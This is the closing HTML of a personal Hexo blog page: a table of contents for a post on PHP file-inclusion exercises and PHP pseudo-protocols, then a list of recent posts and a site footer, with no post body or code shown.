class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-fileinclude"><span class="toc-number">1.</span> <span class="toc-text">PHP_fileinclude</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-include1"><span class="toc-number">1.1.</span> <span class="toc-text">file_include1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-include2"><span class="toc-number">1.2.</span> <span class="toc-text">file_include2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-include3"><span class="toc-number">1.3.</span> <span class="toc-text">file_include3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-include4"><span class="toc-number">1.4.</span> <span class="toc-text">file_include4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">PHP伪协议总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BB"><span class="toc-number">2.2.</span> <span class="toc-text">详细解读</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter"><span class="toc-number">2.2.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.2.</span> <span class="toc-text">file:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">2.2.3.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.4.</span> <span class="toc-text">data:&#x2F;&#x2F;协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-bzip2-zlib-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.5.</span> <span class="toc-text">zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/19/%E5%AF%92%E5%81%87%E7%AC%94%E8%AE%B01/" title="寒假笔记1">寒假笔记1</a><time datetime="2025-01-19T03:40:27.000Z" title="发表于 2025-01-19 11:40:27">2025-01-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E6%B3%95/" title="正则表达式语法">正则表达式语法</a><time datetime="2024-12-08T08:18:40.000Z" title="发表于 2024-12-08 16:18:40">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%952/" title="学习记录2">学习记录2</a><time datetime="2024-12-07T14:19:51.000Z" title="发表于 2024-12-07 22:19:51">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/19/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/" title="学习记录1">学习记录1</a><time datetime="2024-11-19T04:01:28.000Z" title="发表于 2024-11-19 12:01:28">2024-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/11/hello-world/" title="Hello World">Hello World</a><time datetime="2024-11-11T09:54:39.632Z" title="发表于 2024-11-11 17:54:39">2024-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By shgshshs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
